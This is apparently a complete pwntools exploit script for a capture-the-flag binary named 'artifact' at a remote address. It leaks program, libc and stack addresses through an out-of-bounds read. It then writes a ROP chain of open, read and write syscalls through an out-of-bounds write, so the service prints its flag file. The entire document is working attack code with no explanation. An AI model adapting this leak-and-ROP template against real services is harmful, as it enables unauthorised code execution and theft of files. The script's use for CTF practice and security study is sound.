from pwn import *

#context.log_level = 'DEBUG'

local = False

if local:
    p = process('artifact')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    gdb.attach(p, '''
    c
    ''')
    pop_rax = 0x0000000000033544
    pop_rdi = 0x0000000000021102
    pop_rsi = 0x00000000000202e8
    pop_rdx = 0x0000000000001b92
    syscall = 0x00000000000bc375
    libc_ret_offset = 240

else:
    p = remote('52.192.178.153', 31337)
    libc = ELF('./libc.so.6')
    pop_rax = 0x000000000003a998
    pop_rdi = 0x000000000001fd7a
    pop_rsi = 0x000000000001fcbd
    pop_rdx = 0x0000000000001b92
    syscall = 0x00000000000bc765
    libc_ret_offset = 241

def read(idx):
    p.sendline('1')
    p.recvline()
    p.sendline(str(idx))
    p.recvuntil(': ')
    res = int(p.recvline())
    p.recvuntil('Choice?\n')
    return res

def write(idx, val):
    p.sendline('2')
    p.recvline()
    p.sendline(str(idx))
    p.recvline()
    p.sendline(str(val))
    p.recvuntil('Choice?\n')


prgm_base = read(202) - 0xbb0
libc_base = read(203) - libc.symbols['__libc_start_main'] - libc_ret_offset
libc.address = libc_base
stack = read(205)

pop_rdi += libc_base
pop_rsi += libc_base
pop_rdx += libc_base
pop_rax += libc_base
syscall += libc_base

print hex(prgm_base)
print hex(libc_base)
print hex(stack)

write(0, int("flag\x00\x00\x00\x00"[::-1].encode('hex'), 16))
write(1, 0)

read_addr = prgm_base + 0x202f00

chain = [
    pop_rdi, stack - 0x738,
    pop_rsi, 0,
    pop_rdx, 2, # syscall open
    pop_rax, 2,
    syscall,

    pop_rdi, 3, # fd
    pop_rsi, read_addr, # buf
    pop_rdx, 100, # count
    pop_rax, 0, # read from 3
    syscall,

    pop_rdi, 1, # fd
    pop_rsi, read_addr, # buf
    pop_rdx, 100, # count
    pop_rax, 1, # write to 1
    syscall,

    pop_rdi, 1,
    pop_rsi, prgm_base,
    pop_rdx, 4,
    pop_rax, 1,
    syscall,
]

for i, thing in enumerate(chain):
    write(203 + i, thing)

p.sendline('3')
print p.recv()
